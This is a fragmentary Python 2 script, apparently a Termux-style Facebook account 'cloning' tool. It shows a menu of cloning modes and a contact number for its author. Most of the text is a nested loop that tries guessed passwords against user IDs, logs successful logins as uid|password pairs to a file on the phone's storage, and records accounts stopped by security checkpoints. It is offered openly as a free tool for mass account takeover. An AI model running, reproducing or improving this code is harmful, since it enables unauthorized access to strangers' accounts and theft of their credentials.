...
__author__ = 'SARFRAZ SHAR'
__copyright = 'All rights reserved . Copyright  SHAR SARFRAZ'
...
\033[1;97m--------------------------------------------------
\033[1;93m(!)\033[1;97m Author   : SARFRAZ BALOUCH
\033[1;93m(!)\033[1;97m WhatsApp   : 03496519800
\033[1;93m(!)\033[1;97m INSTA         : SARFRAZ AHMED
\033[1;93m(!)\033[1;97m NOTE :THIS TOOL NOTE FOR SALE) ENJOY FREE CLONING
\033[1;97m--------------------------------------------------
"""
...
def menu():
    ...
    print '\x1b[1;92m[5] Random number Cloning'
    print '\x1b[1;92m[6] Random other login Cloning'
    print '\x1b[1;92m[7] Cloning pro1 login'
    print '\x1b[1;92m[8] Cloning fast login'
    print '\x1b[1;92m[9] contact tool.owner'
    print '\x1b[1;92m[10] Logout'
    print '\x1b[1;92m[11] Delete trash files'
    menu_s()
...
def menu_s():
    ...
    if ms == '1':
        ...
        os.system('python2 Cloner.Max')
    elif ms == '6':
        os.system('python2 Ssbaloch.py')
    elif ms == '7':
        os.system('python2 Sarfraz1.Max')
    elif ms == '8':
        os.system('python2 Shar6.py')
    elif ms == '9':
        os.system('xdg-open https://wa.me/+923496519800')
    elif ms == '10':
        lout()
                                    ...
                                    if 'loc' in q:
                                        ...
                                        if 'loc' in q:
                                            ...
                                            if 'loc' in q:
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[SARFRAZ-OK] \x1b[1;32m' + uid + ' | ' + pass11 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/SARFRAZ_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass11 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass11)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[SARFRAZ-CP] ' + uid + ' | ' + pass11
                                                    cp = open('SARFRAZ_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass11 + '\n')
                                                    cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[SARFRAZ-OK] \x1b[1;32m' + uid + ' | ' + pass14 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/SARFRAZ_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass14 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass14)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[SARFRAZ-CP] ' + uid + ' | ' + pass14
                                                    cp = open('SARFRAZ_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass14 + '\n')
                                                    cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[SARFRAZ-OK] \x1b[1;32m' + uid + ' | ' + pass15 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/SARFRAZ_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass15 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass15)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[SARFRAZ-CP] ' + uid + ' | ' + pass15
                                                    cp = open('SARFRAZ_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass15 + '\n')
                                                    cp.close()
